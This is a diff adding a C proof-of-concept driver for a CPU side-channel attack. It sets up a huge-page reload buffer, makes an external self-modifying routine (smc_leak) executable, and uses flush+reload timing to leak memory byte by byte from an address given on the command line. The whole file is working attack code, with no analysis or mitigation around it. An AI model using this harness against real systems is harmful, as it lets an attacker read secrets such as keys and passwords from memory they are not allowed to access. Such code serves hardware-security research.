@@ -1,0 +1,60 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <unistd.h>
+#include <ctype.h>
+#include <pthread.h>
+#include "flush_reload.h"
+
+extern  void smc_leak(unsigned char *reload_buf, char *leak_ptr);
+
+int main(int argc, char **argv)
+{
+    uint64_t leak_addr;
+    uint32_t leak_length;
+    uint8_t *leak_ptr;
+
+    if (argc > 2)
+    {
+        sscanf(argv[1], "0x%lx", &leak_addr);
+        sscanf(argv[2], "%d", &leak_length);
+        leak_ptr = (uint8_t *) leak_addr;
+    }
+    else
+    {
+        leak_ptr = "This is a test to verify that it leaks";
+        leak_length = strlen(leak_ptr);
+    }
+
+    /* Setup */
+    __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
+    unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
+                                                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+    assert(reload_buf != MAP_FAILED);
+    assert(mprotect(&smc_leak, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
+
+    for(int i=0; i<leak_length; i++)
+    {
+        memset(results, 0, sizeof(results));
+
+        for(int j=0; j<ITER; j++)
+        {
+            flush(reload_buf);
+            smc_leak(reload_buf, leak_ptr+i);
+            reload(reload_buf, results);
+        }
+
+        printf("0x%016lx :\n", (uint64_t)(leak_ptr+i));
+        print_results(results, ITER/10);
+    }
+
+    return 0;    
+}
+
